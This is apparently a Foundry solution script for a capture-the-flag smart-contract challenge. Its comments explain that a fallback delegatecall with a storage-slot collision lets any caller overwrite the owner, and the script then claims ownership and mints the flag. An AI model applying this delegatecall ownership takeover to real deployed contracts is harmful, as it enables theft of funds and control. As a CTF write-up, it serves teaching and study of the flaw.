// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Script.sol";
import "../src/IChallenge7.sol";

contract Solve7Script is Script {
    function run() external {
        vm.startBroadcast();
        address target = 0xC962D4f4E772415475AA46Eed06cb1F2D4010c0A;
        IChallenge7 challenge = IChallenge7(target);

        // 1. Claim ownership via delegatecall
        // The fallback function in Challenge7 delegatecalls to Challenge7Delegate.
        // Challenge7Delegate.claimOwnership() sets owner = msg.sender (slot 0).
        // This overwrites Challenge7.owner (also slot 0).
        challenge.claimOwnership();

        // 2. Mint flag
        challenge.mintFlag();

        vm.stopBroadcast();
    }
}
